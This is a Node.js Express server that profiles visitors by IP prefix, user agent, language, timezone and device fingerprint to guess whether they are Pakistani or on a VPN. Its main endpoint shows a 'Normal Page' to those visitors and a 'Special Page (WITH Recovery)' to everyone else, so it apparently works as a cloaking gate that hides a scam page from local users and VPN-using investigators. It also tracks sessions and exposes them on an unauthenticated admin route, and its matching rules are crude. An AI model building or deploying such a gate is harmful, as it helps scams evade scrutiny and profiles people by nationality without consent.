// server.js - ADVANCED PAKISTAN USER DETECTION
const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// In-memory storage for user sessions
const userSessions = new Map();
const suspiciousIPs = new Map();

// Advanced Pakistan detection function
function detectPakistanUser(req, clientIP) {
    const headers = req.headers;
    const userAgent = headers['user-agent'] || '';
    
    // 1. IP Check (Basic)
    const pakistanIPs = [
        '39.34.', '39.35.', '39.36.', '39.37.', '39.38.', '39.39.', 
        '101.50.', '101.51.', '101.52.', '101.53.', '101.54.',
        '110.36.', '110.37.', '110.38.', '110.39.', '110.40.',
        '111.68.', '111.69.', '111.70.', '111.71.', '111.72.',
        '113.203.', '113.204.', '113.205.', '113.206.', '113.207.',
        '115.186.', '115.187.', '115.188.', '115.189.', '115.190.',
        '116.0.', '116.1.', '116.2.', '116.3.', '116.4.', '116.5.',
        '117.102.', '117.103.', '117.104.', '117.105.', '117.106.',
        '119.152.', '119.153.', '119.154.', '119.155.', '119.156.',
        '182.176.', '182.177.', '182.178.', '182.179.', '182.180.',
        '202.141.', '202.142.', '202.143.', '202.144.', '202.145.',
        '203.81.', '203.82.', '203.83.', '203.84.', '203.99.',
        '210.1.', '210.2.', '210.3.', '210.4.', '210.5.'
    ];
    
    let isPakIP = false;
    for (const range of pakistanIPs) {
        if (clientIP.startsWith(range)) {
            isPakIP = true;
            break;
        }
    }
    
    // 2. User-Agent Analysis
    const isPakUserAgent = analyzeUserAgent(userAgent);
    
    // 3. Language Detection
    const acceptLanguage = headers['accept-language'] || '';
    const isPakLanguage = detectPakistaniLanguage(acceptLanguage);
    
    // 4. Timezone Detection (from headers if available)
    const timezoneOffset = headers['timezone-offset'] || '';
    const isPakTimezone = detectPakistaniTimezone(timezoneOffset);
    
    // 5. Behavioral Analysis (if previous session exists)
    const sessionId = headers['session-id'] || clientIP;
    const userBehavior = analyzeUserBehavior(sessionId, req);
    
    // 6. VPN/Proxy Detection (advanced)
    const isVPN = detectAdvancedVPN(headers, clientIP);
    
    // 7. Device Fingerprinting (simplified)
    const deviceFingerprint = createDeviceFingerprint(req);
    const isPakDevice = checkPakistaniDevicePatterns(deviceFingerprint);
    
    // Weighted scoring system
    let pakScore = 0;
    const maxScore = 10;
    
    if (isPakIP) pakScore += 3;           // IP match
    if (isPakUserAgent) pakScore += 2;    // User-agent patterns
    if (isPakLanguage) pakScore += 2;     // Language preferences
    if (isPakTimezone) pakScore += 1;     // Timezone
    if (isPakDevice) pakScore += 1;       // Device patterns
    if (!isVPN) pakScore += 1;           // Not using VPN
    
    // Adjust score based on behavior
    pakScore += userBehavior.score;
    
    console.log('🧠 Advanced Detection Results:', {
        ip: clientIP,
        isPakIP,
        isPakUserAgent,
        isPakLanguage,
        isPakTimezone,
        isVPN,
        isPakDevice,
        userBehavior: userBehavior.score,
        totalScore: pakScore,
        threshold: 5
    });
    
    // Decision: Score 5+ means likely Pakistan user
    return pakScore >= 5;
}

// Helper functions
function analyzeUserAgent(userAgent) {
    // Check for Pakistani mobile devices, browsers, etc.
    const pakPatterns = [
        /PK-/i,                    // Pakistan locale
        /ur_PK/i,                  // Urdu Pakistan
        /Android.*PK/i,            // Android Pakistan
        /iPhone.*PK/i,             // iPhone Pakistan
        /JazzWing/i,               // Pakistani ISP devices
        /Telenor/i,                // Telenor Pakistan
        /Zong/i,                   // Zong Pakistan
        /Ufone/i,                  // Ufone Pakistan
        /Mobilink/i,               // Mobilink Pakistan
        /Warid/i,                  // Warid Pakistan
    ];
    
    for (const pattern of pakPatterns) {
        if (pattern.test(userAgent)) {
            return true;
        }
    }
    
    // Check for common Pakistani browsers
    const lowerUA = userAgent.toLowerCase();
    if (lowerUA.includes('pk') || lowerUA.includes('pakistan')) {
        return true;
    }
    
    return false;
}

function detectPakistaniLanguage(acceptLanguage) {
    // Pakistani languages: ur (Urdu), ps (Pashto), sd (Sindhi), etc.
    const pakLanguages = ['ur', 'ps', 'sd', 'pa', 'bal', 'brh'];
    
    for (const lang of pakLanguages) {
        if (acceptLanguage.toLowerCase().includes(lang)) {
            return true;
        }
    }
    
    // Check for Pakistan locale
    if (acceptLanguage.toLowerCase().includes('pk') || 
        acceptLanguage.toLowerCase().includes('pak')) {
        return true;
    }
    
    return false;
}

function detectPakistaniTimezone(timezoneOffset) {
    // Pakistan Standard Time: UTC+5
    const pstOffsets = ['+05:00', '+0500', '5'];
    
    for (const offset of pstOffsets) {
        if (timezoneOffset.includes(offset)) {
            return true;
        }
    }
    
    return false;
}

function analyzeUserBehavior(sessionId, req) {
    const now = Date.now();
    const session = userSessions.get(sessionId) || {
        firstSeen: now,
        lastSeen: now,
        requestCount: 0,
        isPakistani: false,
        confidence: 0
    };
    
    // Update session
    session.requestCount++;
    session.lastSeen = now;
    
    // Check request patterns
    const headers = req.headers;
    
    // Pakistani users often have specific headers
    let behaviorScore = 0;
    
    // Check for Pakistani referrers
    const referer = headers['referer'] || '';
    if (referer.includes('.pk') || referer.includes('pakistan')) {
        behaviorScore += 2;
    }
    
    // Check for Pakistani domains in origin
    const origin = headers['origin'] || '';
    if (origin.includes('.pk')) {
        behaviorScore += 3;
    }
    
    // Check connection speed (Pakistani users often have slower connections)
    const connection = headers['connection'] || '';
    const saveData = headers['save-data'] || '';
    
    if (saveData === 'on') {
        behaviorScore += 1; // Data saving mode common in Pakistan
    }
    
    // Store updated session
    session.confidence = Math.min(behaviorScore, 5);
    userSessions.set(sessionId, session);
    
    return {
        score: behaviorScore,
        isReturning: session.requestCount > 1,
        confidence: session.confidence
    };
}

function detectAdvancedVPN(headers, clientIP) {
    // Advanced VPN detection
    const vpnIndicators = [];
    
    // 1. Check for VPN/proxy headers
    const proxyHeaders = [
        'via', 'x-forwarded-for', 'x-proxy-id', 'x-real-ip',
        'cf-connecting-ip', 'cf-ipcountry', 'x-client-ip'
    ];
    
    for (const header of proxyHeaders) {
        if (headers[header] && headers[header] !== clientIP) {
            vpnIndicators.push(`header:${header}`);
        }
    }
    
    // 2. Check for cloud hosting IPs
    const cloudRanges = [
        '104.200.', '185.159.', '45.134.', '91.200.', '103.146.',
        '5.188.', '207.244.', '104.128.', '185.93.', '45.87.',
        '104.139.', '104.140.', '104.141.', '104.142.'
    ];
    
    for (const range of cloudRanges) {
        if (clientIP.startsWith(range)) {
            vpnIndicators.push(`cloud:${range}`);
            break;
        }
    }
    
    // 3. Check IP reputation (simulated)
    const suspiciousCount = suspiciousIPs.get(clientIP) || 0;
    if (suspiciousCount > 2) {
        vpnIndicators.push('suspicious');
    }
    
    // 4. Check for anonymous proxies
    const anonymousHeaders = ['proxy-connection', 'x-anonymous-id'];
    for (const header of anonymousHeaders) {
        if (headers[header]) {
            vpnIndicators.push(`anonymous:${header}`);
        }
    }
    
    // Mark IP as suspicious if multiple indicators
    if (vpnIndicators.length > 0) {
        suspiciousIPs.set(clientIP, (suspiciousCount || 0) + 1);
        return true;
    }
    
    return false;
}

function createDeviceFingerprint(req) {
    const headers = req.headers;
    
    // Create a simple fingerprint from available data
    const fingerprint = {
        userAgent: headers['user-agent'] || '',
        accept: headers['accept'] || '',
        acceptLanguage: headers['accept-language'] || '',
        acceptEncoding: headers['accept-encoding'] || '',
        connection: headers['connection'] || '',
        platform: headers['sec-ch-ua-platform'] || '',
        mobile: headers['sec-ch-ua-mobile'] || ''
    };
    
    return JSON.stringify(fingerprint);
}

function checkPakistaniDevicePatterns(fingerprint) {
    const fp = JSON.parse(fingerprint);
    const ua = fp.userAgent.toLowerCase();
    
    // Pakistani mobile operators
    const pakMobileOperators = [
        'jazz', 'telenor', 'zong', 'ufone', 'mobilink', 'warid',
        'jazzcash', 'easypaisa', 'upaisa'
    ];
    
    for (const operator of pakMobileOperators) {
        if (ua.includes(operator)) {
            return true;
        }
    }
    
    // Check for Pakistani apps
    const pakApps = ['daraz', 'foodpanda', 'bykea', 'careem', 'pakistan'];
    for (const app of pakApps) {
        if (ua.includes(app)) {
            return true;
        }
    }
    
    return false;
}

// Main decision endpoint
app.get('/dc', (req, res) => {
    try {
        // Get client IP
        let clientIP = req.headers['x-forwarded-for'] || 
                      req.headers['x-real-ip'] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress || 
                      req.ip;
        
        // Clean IP address
        if (clientIP.includes(',')) {
            clientIP = clientIP.split(',')[0].trim();
        }
        if (clientIP.startsWith('::ffff:')) {
            clientIP = clientIP.replace('::ffff:', '');
        }
        
        console.log('🔍 Advanced Detection for IP:', clientIP);
        
        // Advanced Pakistan user detection
        const isPakistanUser = detectPakistanUser(req, clientIP);
        
        // Advanced VPN detection
        const isVPN = detectAdvancedVPN(req.headers, clientIP);
        
        // 🔥 FINAL DECISION LOGIC:
        // showPage: false = Normal Page (NO Recovery) → Pakistan user OR VPN user
        // showPage: true = Special Page (WITH Recovery) → Non-Pakistan, non-VPN user
        
        let showPage = true; // Default: Special Page
        let message = '';
        
        if (isPakistanUser || isVPN) {
            // ✅ Pakistan user OR VPN user = Normal Page
            showPage = false; // Normal Page (NO Recovery)
            message = isPakistanUser ? 
                (isVPN ? "Pakistan user with VPN → Normal Page" : "Pakistan user → Normal Page") :
                "VPN user → Normal Page";
        } else {
            // ❌ Non-Pakistan, non-VPN = Special Page
            showPage = true; // Special Page (WITH Recovery)
            message = "Non-Pakistan user → Special Page";
        }
        
        const response = {
            showPage: showPage,  // true=Special, false=Normal
            ip: clientIP,
            isPakistanUser: isPakistanUser,
            isVPN: isVPN,
            detectionMethod: isPakistanUser ? "Advanced Multi-factor" : "Basic",
            timestamp: new Date().toISOString(),
            message: message
        };
        
        console.log('📊 Final Decision:', response);
        res.json(response);
        
    } catch (error) {
        console.error('❌ Server Error:', error);
        res.status(500).json({
            showPage: false, // Default to Normal Page on error
            error: 'Server error',
            timestamp: new Date().toISOString()
        });
    }
});

// Test endpoint with detailed analysis
app.get('/analyze', (req, res) => {
    let clientIP = req.headers['x-forwarded-for'] || req.ip;
    
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    if (clientIP.startsWith('::ffff:')) clientIP = clientIP.replace('::ffff:', '');
    
    const analysis = {
        ip: clientIP,
        headers: req.headers,
        userAgent: req.headers['user-agent'],
        acceptLanguage: req.headers['accept-language'],
        timezone: req.headers['timezone-offset'],
        sessionId: req.headers['session-id'] || 'none',
        isPakistanUser: detectPakistanUser(req, clientIP),
        isVPN: detectAdvancedVPN(req.headers, clientIP),
        recommendation: detectPakistanUser(req, clientIP) ? 'Normal Page' : 'Special Page'
    };
    
    res.json(analysis);
});

// Admin endpoint to see detected patterns
app.get('/admin/stats', (req, res) => {
    res.json({
        userSessions: Array.from(userSessions.entries()).slice(0, 10),
        suspiciousIPs: Array.from(suspiciousIPs.entries()).slice(0, 10),
        totalSessions: userSessions.size,
        totalSuspiciousIPs: suspiciousIPs.size
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        message: 'Advanced Detection System Running',
        features: [
            'IP Analysis',
            'User-Agent Pattern Recognition',
            'Language Detection',
            'Timezone Detection',
            'Behavioral Analysis',
            'Advanced VPN Detection',
            'Device Fingerprinting'
        ],
        timestamp: new Date().toISOString()
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Advanced Detection Server running on port ${PORT}`);
    console.log(`📌 Main endpoint: http://localhost:${PORT}/dc`);
    console.log(`📌 Analysis: http://localhost:${PORT}/analyze`);
    console.log(`📌 Admin stats: http://localhost:${PORT}/admin/stats`);
    console.log(`📌 Health check: http://localhost:${PORT}/health`);
    console.log(`\n🔍 Detection Features:`);
    console.log(`✅ Multi-factor Pakistan user detection`);
    console.log(`✅ Behavioral pattern analysis`);
    console.log(`✅ Advanced VPN/proxy detection`);
    console.log(`✅ Device fingerprinting`);
    console.log(`✅ Real-time session tracking`);
    console.log(`✅ IP reputation system`);
});
